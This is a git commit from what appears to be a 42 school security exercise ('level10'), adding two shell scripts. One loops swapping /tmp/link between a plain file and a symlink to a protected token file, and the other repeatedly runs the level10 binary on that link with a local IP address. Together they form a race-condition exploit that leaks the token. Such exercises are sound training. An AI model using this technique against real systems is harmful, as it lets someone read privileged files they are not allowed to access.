e327b40b24ba1cae761f5bf43bc0d234c35745ed
Nicolas WYSEUR <nwyseur@paul-f5Ar3s7.clusters.42paris.fr>
2025-01-21 19:51:29 +0100

    level10 en cours

---
+++ level10/Ressources/spam.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+while true; do
+        /home/user/level10/level10 /tmp/link 192.168.56.101
+done
---
+++ level10/Ressources/symlink.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+while true; do
+        touch /tmp/link
+        rm -f /tmp/link
+        ln -s /home/user/level10/token /tmp/link
+        rm -f /tmp/link
+done
